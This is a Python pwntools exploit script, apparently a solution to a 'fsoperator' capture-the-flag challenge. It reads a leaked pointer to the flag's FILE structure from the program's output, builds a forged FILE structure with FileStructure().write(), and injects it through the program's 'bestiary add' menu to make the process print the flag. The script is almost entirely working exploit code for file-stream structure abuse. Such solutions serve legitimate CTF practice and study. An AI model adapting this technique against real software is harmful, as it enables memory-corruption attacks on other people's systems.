#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)
to = 2

ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b main
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        #return remote("spaceheroes-fsoperator.chals.io", 443, ssl=True, sni="spaceheroes-fsoperator.chals.io") 
        return remote("localhost", 5000)
    else:
        return process(binary)

def store(p, item):
    sl(p,"store")
    ru(p, b">")
    sl(p, item)
 

def beast(p, action, payload):
    ru(p, b">")
    sl(p, b"bestiary")
    ru(p, b">")
    sl(p, action)
    ru(p, b"Enter Contents:")
    p.send(payload) 




def exploit(p,e):
    ru(p, b"flag   = ")
    flag = int(rl(p).strip(), 16)
    log.info(f"Recieved flag fd pointer {hex(flag)}")
    ru(p, b"list of commands.\n")

    store(p, b"flag")
    store(p, b"flag")

    ru(p, b"You don't have enough money to buy ")
    flag_file_ptr = int(rl(p).strip(),16)

    log.info(f"Found flag FILE* struct {hex(flag_file_ptr)}")

    fp = FileStructure()
    payload = fp.write(addr=flag_file_ptr, size=100)

    beast(p, b"add", payload)
    p.interactive()

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)

    exploit(p,e)
